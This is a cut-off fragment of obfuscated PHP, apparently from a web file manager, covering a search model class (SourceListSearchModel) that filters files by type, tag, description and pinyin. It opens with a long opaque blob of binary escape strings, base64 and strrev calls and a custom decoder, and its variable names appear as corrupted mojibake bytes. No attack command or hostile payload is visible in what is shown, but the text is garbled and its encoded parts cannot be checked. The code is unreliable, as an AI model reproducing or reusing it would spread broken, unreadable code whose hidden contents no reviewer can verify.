üY¢')."\xe9\x4c\x4a\x66\x37\x15\x6a\x80\x4c\x3c\xb\x6c\x63\x96\x9e\x36\x2d\x22\xf5\x4a\x6e\xb\xa\x4e\x42\xef\x97\x83\x31\x93\x4b\xfb\xf8\xd8\x45\xaf\x50\x4\xf6\x14\x23\xa1\x38\xc6\x2\x24\x87"."\226\144\277\63\222\247\152\24\222\134\203\113\354\210\177\272\302\371\30\225\226\114\3\323\244\10\222\276\22\113\343\121\122\111\27\13\210\230\235\54\365\362\263\2\17\243\301"."\xee\x2a\x28\xf2\x3e\xce\x2e\x1f\xe0\x2\x88\xb\x10\xdc\x3\x5b\x8e\x43\xc5\x62\xaf\xb4\xa2\x67\x72\x16\x52\x67\x59\x16\x1a\x87\xb7\x52\xe1\x48\x43\x8e\xb1\x91\x5c\x86\x87\x6a\xe2\x98\xa"."\125\221\50\151\104\323\334\235\20\214\216\30\44\210\30\325\231\151\237\177\172\275\177\6\250\242\345\213\14\214\315\5\232\205\326\202\204\6\230\333\147\164\20\354\364\40\235".base64_decode('SGNKJy7EuYZwPkD8iPD5JA5HeMiS9i2d2/ARzxsyWREH49S0DyfoqhRPRwhHt7g=').base64_decode('LB89CdDKcMeD+/G869lthAcu8xlPIeBiXnarTnKJfggjUgQyqZNzaWDEAT/1ScI=').strrev('NG,X-¦	¸$Ş	°ñåi[¥Óõ|ZšÅaá?WınFåÉ”à]9_¬').base64_decode('2xWgJkuu3BzEUw3rvUDmmQ6gs60zyEHNfHlSuVG4QgozuyDxUvdw3kgrsfiiaDg=')."\24\153\211\46\27\53\375\272\43\275\60\117\236\10\160\57\145\242\362\242\3\317\260\272\227\173\311\307\237\376\136\304\124\372\63\234\267\266\5\27\55\31\156\111\117\0\271"."\x8b\xa5\xf8\xa7\x5b\x65\x25\x16\xf0\x25\x8c\x5c\x59\x1e\xac\xc8\xab\x90\x3a\x27\xf4\x5a\x52\xe2\xa2\xa5\x97\xa7\x1f\xd5\xc9\x73\xdc\xa2\xc5\x52\x86\x52\x85\xd6\x40\xfa\xca\x35\x20\xf4\x77"."\xa7\x46\x1b\xb1\x5e\x98\xa8\xf1\x46\x61\xc8\xb0\xd\xb1\xf0\x59\x8e\x51\xb9\x74\xa1\xaa\xb4\xf8\x43\xd\x19\xf9\x5d\x7\x69\x6\xc4\x60\xd3\x5a\xca\x3d\x71\x81\x1f\x23\xd9\x3d\xb8\x47\x68"."\246\323\44\173\144\53\62\115\75\274\76\47\36\6\41\101\351\311\226\242\245\31\266\56\1\350\333\41\123\341\156\3\22\361\135\157\252\345\372\244\140\311\275\203\126\254\112".base64_decode('pRUwmOT0rVKCBH4Y+3/cVCMjnC8ZGWYwwK+iUc/zYfn9PVZn2bM03/nAjU8cFag=')."\304\221\15\173\105\313\44\54\66\360\204\24\26\215\253\324\237\213\250\2\311\154\326\150\121\76\134\12\146\202\174\210\351\7\366\61\27\141\112\143\34\20\14\60\116\16\245".strrev('üB‡:#ÙJıåşl¬ºâzé·kÇªyê¸uÙÆ'."\0".'ôDL32¬a}¬2„¨êá').base64_decode('NQmR1RtToQEoWhEaDJ5AaVLq6ONR/H0ApZFdrBUVEK9QkXzRcYmHbbLBtjQ3FEA=')."\70\32\41\22\140\263\27\63\77\132\6\160\251\55\142\254\135\334\116\16\277\216\120\350\63\345\361\43\204\27\133\337\323\227\335\250\34\352\103\74\275\356\224\77\366\102\263"."\377\237\144\244\221\111\311\172\320\135\110\171\203\154\357\226\46\330\53\374\216\115\326\34\166\77\357\206\41\336\227\153\134\157\326\110\213\206\334\377\224\137\331\141\157\235\40".strrev('ÈòPùìh(’JD.»@g[‹r5œ%QË^ÔÉMò3l¿'."\r".'ÓúdàT‘ õÕÎ').base64_decode('VQujtPDchfvFDQ5W3O93iGdRxM7nfjiCnzHaAsVtx/UwScpMaf0+yk9hWiVCzaM=').base64_decode('8rdskUl6gSKZtibDZ3GBlIC9EpbxkSesKAHzvqchrR9OFeXc/TmzV8slqFGT6wY=')."\x86\x85\x64\x21\x6e\xa8\xe8\x4a\x46\x41\x41\xad\x58\x9c\xf0\x48\x3\x78\x1c\x7a\xbc\x51\x2a\x44\xa9\xaa\xd8\x5\xb5\x24\x59\x4b\xb6\x89\xa5\x7\x39\xe2\x52\x13\x24\x47\xb5\x75\xd2\x93\x1b"."\350\266\134\44\73\115\343\312\311\126\351\261\350\140\371\351\33\66\272\202\325\56\333\44\302\101\150\100\26\206\40\201\322\250\210\11\166\55\62\214\20\210\43\365\221\17\262".strrev('>c»é%÷‰Ñó"_ÃU‹¼}ïLqû²´ìXp$—z-?%„P®/İ [ùæeŠ')."\376\306\230\217\72\371\363\301\313\142\76\161\71\355\333\36\155\21\157\300\272\37\216\305\155\346\106\174\145\54\275\227\233\347\103\345\311\220\360\16\134\312\54\327\361\211\63".base64_decode('x0IpL05xUcAt3ZR1WOphycr5yImrjzk78wyH6JU8MxXG8LvLoLacRGTJuKlOQ2M=').base64_decode('r8VOrbzJDBfWqZYuLmlQl5NljwOtyGfqZ8yaJ6sGxPyI8x/mhpr+AA8gZlxx45M=')."\302\374\134\312\353\226\104\272\315\154\313\237\0\364\120\340\377\31\346\13\336\233\46\225\214\136\313\37\112\55\33\1\202\204\222\71\210\264\41\171\216\362\115\174\302\156\213"."\xe5\x43\xb7\x20\xf1\xf0\x9f\xbb\x2e\xba\x29\x57\xe8\x87\xb4\xef\x88\x95\x40\x5f\x62\x33\x73\x58\x42\xcd\x63\x2d\xab\x63\x69\x6e\x71\xac\x92\xd4\x41\x46\x82\x89\x38\x6\x79\xc5\x58\xf7\xb6"."\235\14\14\350\42\104\264\44\226\310\45\72\246\127\221\202\263\343\175\211\350\361\342\5\346\201\33\137\272\25\153\112\42\51\377\203\11\144\222\7\25\122\204\41\107\205\236"."\x7\x4f\x60\x74\xa3\xc2\x4b\x7b\xd2\x69\xf8\xb7\xb4\x9b\xf2\x4c\x5c\xca\xf2\x6b\x8e\x5f\x42\x48\x49\xf9\xa6\x3b\x71\x32\xc1\xc0\x7d\x8\xa1\xcf\xdd\x57\x4f\xf1\x28\x9b\x28\xa3\xc7\xa7\x4c"._kodDe('MpSAXYgKfv/QgtqCENP1o1IS54V8XQWLfmAGLp6MFMAXRqHbEd6dE2F8Pviod7aC')."\136\174\23\152\24\242\167\201\116\300\32\46\336\45\311\65\267\320\42\176\365\115\223\214\157\360\170\112\217\155\232\362\267\373\136\171\234\371\353\104\365\271\244\64\24\156\361"."\274\307\112\350\220\367\221\126\66\50\144\361\13\272\46\335\241\164\211\4\374\75\55\227\210\140\173\237\272\103\54\225\354\111\27\5\71\332\303\6\12\4\220\30\102\323\332"."\xa4\xfd\x51\x6c\x85\xe2\x6b\xa2\xe7\xd3\xdd\x6f\xab\xbb\xae\x9a\x62\x47\x41\x9e\xb5\xce\x2e\xb0\xda\x9e\x7\x28\xa9\x37\x54\xfa\xcd\xd8\xeb\xff\xeb\xb7\xdd\xfe\x5f\x3d\xe9\x36\xab\x8e\x29".strrev('2Æ“Şrå¢¸v4¤>b‹9“ÚÜÂ–0ÄXîM½Ãôõ(ªe’cdq—&.¹Ï]«').strrev('…r	’ÊâXRíÌ~`áP=#cõéM¸Êd‚¸®~UdW·JÆ¹ü|„Kåì ±').strrev('ÊêC\\¤üŒ¨"¢¶Ü„Ô`N{˜@µWÉ‘xÈİò’£$ŒÂjXÒ¾È+Dæ	X')."\243\45\136\157\347\157\107\273\162\264\173\236\2\244\211\154\171\154\135\372\351\362\163\342\362\334\174\31\313\131\260\215\254\133\225\303\337\146\256\363\76\326\74\335\137\136\31".base64_decode('NVHH2oQElt+ZRoYcYZAjxgp5KNolRZoJEL/y8uNPMAr1FP6S+8uWcadlEn7MDeU=')."\72\15\311\332\120\172\50\270\354\41\120\317\121\0\22\216\304\331\230\141\22\177\342\320\355\144\127\173\15\271\145\1\230\212\170\373\126\123\74\330\236\57\122\45\231\274\245"."\xb2\xeb\x4d\x92\x75\x30\x80\x5c\xaa\x2c\x5b\x7e\xa0\xc1\x9d\x13\xdb\x7b\xbb\x57\xca\x82\x4a\xc9\xd2\xa6\x65\x4b\xc9\x38\xbc\x52\x5a\xfc\xd6\xaa\xe3\x1a\x4d\xe1\xe4\xdd\xeb\xdc\x9d\x8\xc2"."\124\266\165\211\270\160\20\51\203\244\163\72\304\355\146\334\257\105\220\110\2\146\336\31\241\4\351\244\311\175\320\307\235\137\227\21\256\222\21\223\242\111\56\346\364\13\375"."\xe2\x6b\x5e\x51\xe1\x4f\x80\x44\x53\x1d\x7a\x68\x48\x73\xd8\x71\x99\x37\x97\xfb\x19\x66\xe9\x58\x30\x4d\x70\x27\x52\x7e\xf2\x23\xe\xa4\xa4\x6d\x9f\x65\xc3\xa2\x88\xa0\xc8\x1e\xb8\x44\xf6"."\5\265\323\206\4\227\42\230\341\114\206\77\371\355\112\232\141\342\0\207\42\210\170\35\34\163\71\322\315\121\141\137\254\17\173\137\164\15\310\267\115\135\11\313\241\342\146".base64_decode('qZRfnA2IbmJYpe6TJePOLt9c5UglQNTfPzeYkQQPbFgvLGloV7gULap035Plyfg=')."\234\241\64\344\32\203\337\5\365\210\122\130\47\301\66\160\117\224\55\277\146\356\76\355\223\305\172\11\5\364\134\114\52\116\76\11\234\60\103\262\162\45\2\53\335\103\54"."\135\60\26\21\154\263\62\135\203\57\21\73\336\61\110\231\220\43\135\315\361\116\55\221\2\4\372\122\140\236\350\61\151\134\310\35\105\323\353\236\326\313\31\274\75\243\71"."\xec\x61\xc3\x49\x67\x25\xd1\xa4\x3c\xb2\x1c\x6e\x95\xd\x2a\x54\x54\xb9\xbd\xde\x56\xb1\x31\xf5\xa\x6c\xa2\x90\xb2\xf6\x48\xe6\x4\x29\xb3\x42\x1e\xda\xa2\x8a\xd9\x68\x14\xce\x29\xb8\x47".base64_decode('V94JhgDnpVE4b1k0yyzpN6R8jlayJ+he+eCB0J+p0GGPaEyTTjSeFROXVwcY500=').base64_decode('TbQElVshhHvPsW6lVlRMPGErRGrPLlCJ1rKYCtRVnO+X03ERV8HagJaJ92jZ4VA=')."\205\150\331\164\241\262\161\103\242\342\322\267\335\126\7\36\270\74\60\314\2\11\311\152\342\145\172\311\232\167\262\213\244\227\12\3\5\223\157\23\31\141\47\206\355\116\371"."\x5b\xee\xbc\xba\xb2\xd2\xdc\xa8\x59\x28\x49\x9e\x37\x2b\x1a\x17\xfb\xb0\x64\x5d\x2e\xc3\xe6\x34\xa6\x27\x97\xac\xb2\xa9\xd4\x62\x3a\x46\x5a\x77\xbb\xf7\x94\x5d\xd\xd1\x78\x56\x49\x4e\xd2"."\307\171\124\141\102\316\167\35\220\127\120\26\21\20\260\153\102\345\354\262\164\247\373\77\350\332\351\21\132\30\37\325\362\143\26\342\177\222\356\227\64\72\151\132\216\17\307"."\245\314\42\371\155\66\35\107\34\51\123\351\231\60\171\170\323\363\111\226\21\350\113\234\251\340\121\44\152\176\202\216\204\154\220\117\70\314\303\142\151\122\247\261\204\330\270"."\2\370\370\200\7\344\75\15\16\365\132\113\236\143\107\1\100\102\144\257\71\302\274\373\341\53\267\242\75\342\11\170\315\313\310\11\36\4\360\115\266\363\40\27\233\355\40".base64_decode('jQmC53g/KQPemQqsLfa7stPXerjt4reVAKpKUQR1D00USti3OvWOWBbVGUoml8U=')."\x13\x2d\xd4\x9b\x74\x59\x34\xc9\x25\xd9\xcd\x94\x45\x75\xb6\xc5\x3b\x26\x8a\x8b\xb4\x87\xa2\xb1\xb2\x38\x6c\x62\xd3\xa1\xa\xf7\x4f\x34\x2a\xda\x49\x5a\x19\x8a\xc5\xe2\xcb\x26\x6a\x45\x34"."\274\130\264\204\234\224\12\15\170\61\153\62\305\66\73\41\110\152\71\46\113\113\227\357\364\274\360\3\46\362\270\125\4\362\274\332\314\105\36\377\160\77\331\342\261\144\143".base64_decode('CAsFYfOYDig7UQQo9q7NFzdnlsXRb8B1RCzBydogFEXCOXkzJYCpFQdI1p6Wa/M=').base64_decode('SawYANywE81eGlhr9kraeiqqwAU4GFLJBIp+Q/T/BvtpnY6zpgAA').base64_decode('').""."", 10, -8))); goto Aá”ò¶º‘Ó; dÍ†ñ¥…›½: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ß¹™óš¥) { $¢îëÇÌ =& $_SERVER[® ¨Ä®ñ]; $Ë†Â’™ = KodIO::fileTypeList(); $Ğø®˜‰ó = $Ë†Â’™[$ß¹™óš¥]; if (!$Ğø®˜‰ó) { return array(); } $·ù¤–Û = $Ğø®˜‰ó[$¢îëÇÌ[167]]; $‹¸Üöçò = $¢îëÇÌ[7]; if (!$Ğø®˜‰ó[$¢îëÇÌ[167]]) { $½õĞŸ¸º = array_to_keyvalue($Ë†Â’™, $¢îëÇÌ[12], $¢îëÇÌ[167]); $·ù¤–Û = implode($¢îëÇÌ[50], $½õĞŸ¸º); $‹¸Üöçò = $¢îëÇÌ[2052]; } $ä«—ÑüÔ = explode($¢îëÇÌ[50], trim($·ù¤–Û, $¢îëÇÌ[50])); return array($‹¸Üöçò, $ä«—ÑüÔ); } public function listPathType($ìíÒ¨ü) { $ÍŞ ÀŒï =& $_SERVER[® ¨Ä®ñ]; $ß¡Ù¨”ğ = $this->fileTypeWhere($ìíÒ¨ü); if (!$ß¡Ù¨”ğ) { return array(); } $ŒÜÈ™ØÛ = array($ÍŞ ÀŒï[571] => SourceModel::TYPE_USER, $ÍŞ ÀŒï[572] => USER_ID, $ÍŞ ÀŒï[568] => 0, $ÍŞ ÀŒï[569] => $ß¡Ù¨”ğ); return $this->listSource($ŒÜÈ™ØÛ); } public function listSearch($ßõÒñ–ó, $§·Ùóç = 300) { $û±£²å’ =& $_SERVER[® ¨Ä®ñ]; if (isset($ßõÒñ–ó[$û±£²å’[1898]]) && $ßõÒñ–ó[$û±£²å’[1898]]) { $ßõÒñ–ó[$û±£²å’[1898]] = str_replace($û±£²å’[379], $û±£²å’[2053], trim($ßõÒñ–ó[$û±£²å’[1898]])); } $Â´’Ş¥ = $this->_parseSearchWhere($ßõÒñ–ó); $Ìö½µ¦Ø = $Â´’Ş¥; if (!isset($Â´’Ş¥[$û±£²å’[422]])) { $Â´’Ş¥[$û±£²å’[422]] = 0; } $õù¼¢ĞÔ = $û±£²å’[2054]; $§¿‡ğŒƒ = $õù¼¢ĞÔ; $this->_listSearchBindPinyin($ßõÒñ–ó, $Â´’Ş¥, $õù¼¢ĞÔ); $this->alias($û±£²å’[435])->_makeOrder(); $Â´’Ş¥ = $this->parseWhereLike($Â´’Ş¥); $¯ò×–·« = $this->distinct(!0)->field($õù¼¢ĞÔ)->where($Â´’Ş¥)->selectPage($§·Ùóç); $this->_listSearchFileContent($¯ò×–·«, $ßõÒñ–ó, $§¿‡ğŒƒ, $Ìö½µ¦Ø); $this->_listSearchDesc($¯ò×–·«, $ßõÒñ–ó, $§¿‡ğŒƒ); $this->_listSearchTag($¯ò×–·«, $ßõÒñ–ó, $§¿‡ğŒƒ); $this->_listSearchGroupTag($¯ò×–·«, $ßõÒñ–ó, $§¿‡ğŒƒ); $this->_listDataApply($¯ò×–·«[$û±£²å’[364]]); $this->_listMake($¯ò×–·«); return $¯ò×–·«; } private function _listSearchFileContent(&$ì‚°íĞì, $ñàÉ•ä, $ˆÇ…œá£, $µÍ„†Ô) { $À¶è›º =& $_SERVER[® ¨Ä®ñ]; if (!$ñàÉ•ä[$À¶è›º[1898]] || $ì‚°íĞì[$À¶è›º[361]][$À¶è›º[348]] > 1) { return; } if (!isset($µÍ„†Ô[$À¶è›º[32]]) || !is_array($ñàÉ•ä[$À¶è›º[458]])) { return; } $µÍ„†Ô[$À¶è›º[458]] = array($À¶è›º[7], $ñàÉ•ä[$À¶è›º[458]]); unset($µÍ„†Ô[$À¶è›º[32]]); unset($ñàÉ•ä[$À¶è›º[458]]); $üàÉ‰— = $this->field($ˆÇ…œá£)->where($µÍ„†Ô)->limit($À¶è›º[2055])->select(); if (!$üàÉ‰— || count($üàÉ‰—) == 0) { return; } $ì‚°íĞì[$À¶è›º[364]] = array_merge($üàÉ‰—, $ì‚°íĞì[$À¶è›º[364]]); $ì‚°íĞì[$À¶è›º[361]][$À¶è›º[362]] += count($üàÉ‰—); } private function _listSearchTag(&$ö‹¨²÷·, $©ÉÄ„£´, $âº­ÔÜÇ) { $à½ÚòùÈ =& $_SERVER[® ¨Ä®ñ]; if (!$©ÉÄ„£´[$à½ÚòùÈ[1898]] || $ö‹¨²÷·[$à½ÚòùÈ[361]][$à½ÚòùÈ[348]] > 1) { return; } $„Ä Û— = Model($à½ÚòùÈ[2056])->listData(); $ßÑ–ò‚³ = array(); $Ü©Çˆ¶ = $©ÉÄ„£´[$à½ÚòùÈ[1898]]; foreach ($„Ä Û— as $®ìÓçÑ) { $ë¨èè‰œ = $®ìÓçÑ[$à½ÚòùÈ[32]]; $¨Ëšâ’ = str_replace($à½ÚòùÈ[53], $à½ÚòùÈ[12], Pinyin::get($ë¨èè‰œ)); if (stripos($ë¨èè‰œ, $Ü©Çˆ¶) !== !1 || stripos($¨Ëšâ’, $Ü©Çˆ¶) !== !1) { $ßÑ–ò‚³[] = $®ìÓçÑ[$à½ÚòùÈ[392]]; } } if (!$ßÑ–ò‚³) { return; } $ããæ›Úİ = array($à½ÚòùÈ[418] => array($à½ÚòùÈ[7], $ßÑ–ò‚³), $à½ÚòùÈ[1639] => USER_ID); $«Ìä–şß = Model($à½ÚòùÈ[419])->field($à½ÚòùÈ[78])->where($ããæ›Úİ)->select(); $«Ìä–şß = array_to_keyvalue($«Ìä–şß, $à½ÚòùÈ[12], $à½ÚòùÈ[78]); $’ğ÷‚ = array_unique($«Ìä–şß); $this->_listSearchMerge($ö‹¨²÷·, $©ÉÄ„£´, $âº­ÔÜÇ, $’ğ÷‚); } private function _listSearchDesc(&$ƒ˜¡ìşò, $öäù¼, $öû‚´â) { $¬šƒœöç =& $_SERVER[® ¨Ä®ñ]; if (!$öäù¼[$¬šƒœöç[1898]] || $ƒ˜¡ìşò[$¬šƒœöç[361]][$¬šƒœöç[348]] > 1) { return; } $õİ‘¾Í = $this->listSearchChildren($öäù¼[$¬šƒœöç[489]]); $õİ‘¾Í = array_unique($õİ‘¾Í); if (!$õİ‘¾Í) { return; } $†á½ÚòÖ = array($¬šƒœöç[394] => array($¬šƒœöç[7], $õİ‘¾Í), $¬šƒœöç[95] => $¬šƒœöç[442], $¬šƒœöç[369] => array($¬šƒœöç[378], $¬šƒœöç[1900] . $öäù¼[$¬šƒœöç[1898]] . $¬šƒœöç[1900])); $ıÏÀ•È = Model($¬šƒœöç[554])->field($¬šƒœöç[394])->where($†á½ÚòÖ)->select(); $£§ŒÒÊ = array_to_keyvalue($ıÏÀ•È, $¬šƒœöç[12], $¬šƒœöç[394]); $this->_listSearchMerge($ƒ˜¡ìşò, $öäù¼, $öû‚´â, $£§ŒÒÊ); } private function _listSearchGroupTag(&$æ¦ª’‹, $íÍøÇëÙ, $ï²à—ÜÃ) { $£ìÓú‚’ =& $_SERVER[® ¨Ä®ñ]; if (!$íÍøÇëÙ[$£ìÓú‚’[1898]] || $æ¦ª’‹[$£ìÓú‚’[361]][$£ìÓú‚’[348]] > 1 || !$íÍøÇëÙ[$£ìÓú‚’[489]]) { return; } $”ä—˜Àò = $this->sourceInfo($íÍøÇëÙ[$£ìÓú‚’[489]]); if (!$”ä—˜Àò || $”ä—˜Àò[$£ìÓú‚’[403]] != SourceModel::TYPE_GROUP) { return; } $Ê‡Ä“Ì = $”ä—˜Àò[$£ìÓú‚’[495]]; $ñâñ¹¼ = Model($£ìÓú‚’[2057])->get($Ê‡Ä“Ì); $¹¾èø©ª = array(); $É­øáğ = $íÍøÇëÙ[$£ìÓú‚’[1898]]; foreach ($ñâñ¹¼[$£ìÓú‚’[364]] as $Áùşøâ) { $ñ¯ÎÑ§ = $Áùşøâ[$£ìÓú‚’[32]]; $ğ¿øéîÜ = str_replace($£ìÓú‚’[53], $£ìÓú‚’[12], Pinyin::get($ñ¯ÎÑ§)); if (stripos($ñ¯ÎÑ§, $É­øáğ) !== !1 || stripos($ğ¿øéîÜ, $É­øáğ) !== !1) { $¹¾èø©ª[] = $Áùşøâ[$£ìÓú‚’[392]]; } } if (!$¹¾èø©ª) { return; } $ïáú¨¥ = array($£ìÓú‚’[418] => array($£ìÓú‚’[7], $¹¾èø©ª), $£ìÓú‚’[1639] => 0, $£ìÓú‚’[33] => $£ìÓú‚’[1920] . $Ê‡Ä“Ì); $Š¡¼Î = Model($£ìÓú‚’[419])->field($£ìÓú‚’[78])->where($ïáú¨¥)->select(); $Š¡¼Î = array_to_keyvalue($Š¡¼Î, $£ìÓú‚’[12], $£ìÓú‚’[78]); $¿ËÏ÷Á‘ = array_unique($Š¡¼Î); $this->_listSearchMerge($æ¦ª’‹, $íÍøÇëÙ, $ï²à—ÜÃ, $¿ËÏ÷Á‘); } private function _listSearchMerge(&$­©Ö†ë, $ğìôéø, $ŞıÓöÅ„, $Üİáäåğ) { $»ãÆ¿»± =& $_SERVER[® ¨Ä®ñ]; if (!$Üİáäåğ) { return; } $¥ï„´Âë = array_to_keyvalue($­©Ö†ë[$»ãÆ¿»±[364]], $»ãÆ¿»±[12], $»ãÆ¿»±[394]); $î½ì€‰ = array_diff($Üİáäåğ, $¥ï„´Âë); if (!$î½ì€‰) { return; } $ÛŸ¨ÑşÖ = array($»ãÆ¿»±[394] => array($»ãÆ¿»±[7], $î½ì€‰)); $ÛÛîÍíÑ = $this->field($ŞıÓöÅ„)->where($ÛŸ¨ÑşÖ)->select(); if (!$ÛÛîÍíÑ) { return; } $™’îéÑ½ = array(); foreach ($ÛÛîÍíÑ as $…Øêµ†â) { if ($this->_listSearchFilter($…Øêµ†â, $ğìôéø)) { $™’îéÑ½[] = $…Øêµ†â; } } $­©Ö†ë[$»ãÆ¿»±[364]] = array_merge($™’îéÑ½, $­©Ö†ë[$»ãÆ¿»±[364]]); $­©Ö†ë[$»ãÆ¿»±[361]][$»ãÆ¿»±[362]] += count($™’îéÑ½); } private function _listSearchFilter($ê‰…öÀ‘, $İßŞò§÷) { $ÄŠ©ÅŒ  =& $_SERVER[® ¨Ä®ñ]; $Æä¸¹ ‰ = $ê‰…öÀ‘[$ÄŠ©ÅŒ [402]] == $ÄŠ©ÅŒ [89]; if (!strstr($ê‰…öÀ‘[$ÄŠ©ÅŒ [512]], $ÄŠ©ÅŒ [50] . $İßŞò§÷[$ÄŠ©ÅŒ [489]] . $ÄŠ©ÅŒ [50])) { return !1; } if (isset($İßŞò§÷[$ÄŠ©ÅŒ [404]]) && $İßŞò§÷[$ÄŠ©ÅŒ [404]] != $ÄŠ©ÅŒ [1861]) { if ($İßŞò§÷[$ÄŠ©ÅŒ [404]] == $ÄŠ©ÅŒ [79] && !$Æä¸¹ ‰) { return !1; } if ($İßŞò§÷[$ÄŠ©ÅŒ [404]] != $ÄŠ©ÅŒ [79] && $Æä¸¹ ‰) { return !1; } if (!strstr($ê‰…öÀ‘[$ÄŠ©ÅŒ [167]], $ÄŠ©ÅŒ [50] . $İßŞò§÷[$ÄŠ©ÅŒ [404]] . $ÄŠ©ÅŒ [50])) { return !1; } } if (isset($İßŞò§÷[$ÄŠ©ÅŒ [2058]]) && $İßŞò§÷[$ÄŠ©ÅŒ [2058]] < $ê‰…öÀ‘[$ÄŠ©ÅŒ [80]]) { return !1; } if (isset($İßŞò§÷[$ÄŠ©ÅŒ [2059]]) && $İßŞò§÷[$ÄŠ©ÅŒ [2059]] > $ê‰…öÀ‘[$ÄŠ©ÅŒ [80]]) { return !1; } if (isset($İßŞò§÷[$ÄŠ©ÅŒ [585]]) && $İßŞò§÷[$ÄŠ©ÅŒ [585]] != $ê‰…öÀ‘[$ÄŠ©ÅŒ [445]]) { return !1; } return !0; } public function listSearchChildren($Š¿İğı, $Ã¯ƒÊÅÄ = 5000) { $–É²ˆ°› =& $_SERVER[® ¨Ä®ñ]; $°Ò¶ÕÂ¤ = array(); $úÑËŸ¬À = $this->sourceInfo($Š¿İğı); $à˜÷™Š = array($–É²ˆ°›[512] => array($–É²ˆ°›[378], $úÑËŸ¬À[$–É²ˆ°›[512]] . $úÑËŸ¬À[$–É²ˆ°›[394]] . $–É²ˆ°›[536])); $•Éö¡½’ = $this->field($–É²ˆ°›[80])->where($à˜÷™Š)->limit($Ã¯ƒÊÅÄ + 1)->select(); $æŞºÏ‡ = is_array($•Éö¡½’) ? count($•Éö¡½’) : 0; if ($æŞºÏ‡ > $Ã¯ƒÊÅÄ) { return $this->_listSearchChildrenNear($Š¿İğı, $Ã¯ƒÊÅÄ); } $“ò³´Éú = $this->field($–É²ˆ°›[394])->where($à˜÷™Š)->select(); $°Ò¶ÕÂ¤ = array_to_keyvalue($“ò³´Éú, $–É²ˆ°›[12], $–É²ˆ°›[394]); return $°Ò¶ÕÂ¤; } private function _listSearchChildrenNear($Êïù‚Ï, $È÷ÕŞ‡²) { $¡Üô«×µ =& $_SERVER[® ¨Ä®ñ]; $’²êŠÔš = array(); $Û‚Õ’ò = array($¡Üô«×µ[489] => $Êïù‚Ï); $ô£™­§½ = $this->field($¡Üô«×µ[2060])->where($Û‚Õ’ò)->select(); $‡¯ª×ü¥ = array_to_keyvalue(array_filter_by_field($ô£™­§½, $¡Üô«×µ[402], $¡Üô«×µ[89]), $¡Üô«×µ[12], $¡Üô«×µ[394]); $’²êŠÔš = array_merge($’²êŠÔš, array_to_keyvalue($ô£™­§½, $¡Üô«×µ[12], $¡Üô«×µ[394])); if (!$‡¯ª×ü¥) { return $’²êŠÔš; } $Û‚Õ’ò = array($¡Üô«×µ[489] => array($¡Üô«×µ[7], $‡¯ª×ü¥)); $ô£™­§½ = $this->field($¡Üô«×µ[2060])->where($Û‚Õ’ò)->limit($È÷ÕŞ‡²)->select(); $’²êŠÔš = array_merge($’²êŠÔš, array_to_keyvalue($ô£™­§½, $¡Üô«×µ[12], $¡Üô«×µ[394])); $’²êŠÔš = array_slice($’²êŠÔš, 0, $È÷ÕŞ‡²); return $’²êŠÔš; } private function _listSearchBindPinyin($¡¸ê…ò¥, &$ÊŠ§ØÛŞ, &$ø…„±ÌÅ) { $¢‹¶¡…« =& $_SERVER[® ¨Ä®ñ]; if (!isset($¡¸ê…ò¥[$¢‹¶¡…«[1898]]) || !$¡¸ê…ò¥[$¢‹¶¡…«[1898]]) { return; } if (!Input::check($¡¸ê…ò¥[$¢‹¶¡…«[1898]], $¢‹¶¡…«[313]) || strlen($¡¸ê…ò¥[$¢‹¶¡…«[1898]]) < 2) { return; } $‡Ü€ö£› = "\114\x45\x46\x54\40\112\x4f\111\x4e\40{$this->tablePrefix}\x69\157\137\163\157\x75\162\143\145\137\155\x65\x74\141\x20\x6d\145\x74\x61\40\157\156\x20\x73\x6f\x75\162\143\145\56\x73\x6f\x75\162\143\145\x49\x44\x20\x3d\40\155\145\164\x61\x2e\163\157\165\162\x63\x65\111\104"; $Ë×¼ç‡‹ = array(); $ø…„±ÌÅ = str_replace(array($¢‹¶¡…«[226], $¢‹¶¡…«[53], $¢‹¶¡…«[2061]), $¢‹¶¡…«[12], $ø…„±ÌÅ); $ø…„±ÌÅ = $¢‹¶¡…«[427] . str_replace($¢‹¶¡…«[50], $¢‹¶¡…«[428], $ø…„±ÌÅ); $°Í¾˜ä = $ÊŠ§ØÛŞ[$¢‹¶¡…«[32]]; unset($ÊŠ§ØÛŞ[$¢‹¶¡…«[32]]); foreach ($ÊŠ§ØÛŞ as $ÔŠ´ĞÄ => $Î¼æÎªÁ) { $Ë×¼ç‡‹[$¢‹¶¡…«[427] . $ÔŠ´ĞÄ] = $Î¼æÎªÁ; } foreach ($°Í¾˜ä as $Œ»Ş–ş²) { $Ë×¼ç‡‹[] = array($¢‹¶¡…«[432] => $Œ»Ş–ş², $¢‹¶¡…«[984] => $¢‹¶¡…«[1902], array($¢‹¶¡…«[2062] => $Œ»Ş–ş², $¢‹¶¡…«[2063] => array($¢‹¶¡…«[7], array($¢‹¶¡…«[455], $¢‹¶¡…«[454])))); } $this->join($‡Ü€ö£›); $ÊŠ§ØÛŞ = $Ë×¼ç‡‹; } private function _parseSearchWhere($ïş¤„ê“) { $şÂİ¸öÈ =& $_SERVER[® ¨Ä®ñ]; $ñß§­ğÚ = array(); if (isset($ïş¤„ê“[$şÂİ¸öÈ[743]]) && $ïş¤„ê“[$şÂİ¸öÈ[743]]) { $ñß§­ğÚ[$şÂİ¸öÈ[86]] = array($şÂİ¸öÈ[2064], $ïş¤„ê“[$şÂİ¸öÈ[743]]); } if (isset($ïş¤„ê“[$şÂİ¸öÈ[487]]) && $ïş¤„ê“[$şÂİ¸öÈ[487]]) { $æÆïó‰ò = array($şÂİ¸öÈ[2065], $ïş¤„ê“[$şÂİ¸öÈ[487]]); if ($ñß§­ğÚ[$şÂİ¸öÈ[86]]) { $ñß§­ğÚ[$şÂİ¸öÈ[86]] = array($ñß§­ğÚ[$şÂİ¸öÈ[86]], $æÆïó‰ò, $şÂİ¸öÈ[2066]); } else { $ñß§­ğÚ[$şÂİ¸öÈ[86]] = $æÆïó‰ò; } } if (isset($ïş¤„ê“[$şÂİ¸öÈ[2058]]) && $ïş¤„ê“[$şÂİ¸öÈ[2058]] > 0) { $ñß§­ğÚ[$şÂİ¸öÈ[80]] = array($şÂİ¸öÈ[2064], $ïş¤„ê“[$şÂİ¸öÈ[2058]]); } if (isset($ïş¤„ê“[$şÂİ¸öÈ[2059]]) && $ïş¤„ê“[$şÂİ¸öÈ[2059]]) { $æÆïó‰ò = array($şÂİ¸öÈ[2065], $ïş¤„ê“[$şÂİ¸öÈ[2059]]); if ($ñß§­ğÚ[$şÂİ¸öÈ[80]]) { $ñß§­ğÚ[$şÂİ¸öÈ[80]] = 